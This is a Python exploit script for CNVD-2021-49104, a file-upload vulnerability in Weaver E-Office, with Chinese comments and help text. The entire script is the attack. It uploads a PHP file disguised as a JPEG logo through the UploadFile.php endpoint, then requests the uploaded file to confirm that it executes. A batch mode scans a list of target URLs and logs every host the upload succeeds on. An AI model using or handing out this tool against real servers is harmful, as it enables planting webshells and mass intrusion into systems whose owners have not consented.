import argparse
import random, requests
import sys
from requests_toolbelt.multipart.encoder import MultipartEncoder


def title():
    print('''
        test.php要和exp.py放在同一个目录下哦
        攻击模式：python exp.py -a true -t target_url 
        批量模式：python exp.py -s true -f file 
                Author:ying
        ''')


def format_url(url):
    try:
        if url[:4] != "http" and url[:5] != "https":
            url = "http://" + url
        elif url[:4] != "http":
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))


def attack(url):
    url = format_url(url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Referer': url
    }
    res = open("output.txt", "a")
    error_file = open("err.txt", 'a')
    multipart_encoder = MultipartEncoder(
        fields={
            'Filedata': ("test.php", open("test.php", 'rb'), 'image/jpeg')
        },
        boundary='-----------------------------' + str(random.randint(1e28, 1e29 - 1))
    )
    headers['Content-Type'] = multipart_encoder.content_type
    url1 = url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    try:
        r1 = requests.post(url1, data=multipart_encoder, headers=headers, timeout=3)
        try:
            url2 = url + "/images/logo/logo-eoffice.php"
            r2 = requests.get(url2, timeout=3)
            if "123" in r2.content.decode():
                print("[+]" + url + " attacked")
                res.write(url + "\n")
                res.flush()
        except Exception as e:
            print("ERROR2---", url)
            error_file.write(url + "\n")
            error_file.flush()
    except Exception as e:
        print("ERROR----", url)


def scan(file):
    for url_link in open(file, 'r', encoding='utf-8'):
        if url_link.strip() != '':
            url_path = format_url(url_link.strip())
            attack(url_path)


def main():
    parser = argparse.ArgumentParser(description = 'CNVD-2021-49104--泛微E-Office文件上传漏洞')
    parser.add_argument('-t', '--target', type=str, help=' 目标URL')
    parser.add_argument('-a', '--attack', type=bool, help=' 攻击模式')
    parser.add_argument('-s', '--scan', type=bool, help=' 批量模式')
    parser.add_argument('-f', '--file', type=str, help=' 文件路径')

    args = parser.parse_args()
    target_url = args.target
    attack_model = args.attack
    scan_model = args.scan
    file = args.file

    if attack_model is True and target_url is not None:
        attack(target_url)
    elif scan_model is True and file is not None:
        scan(file)
    else:
        sys.exit(0)


if __name__ == '__main__':
    title()
    main()
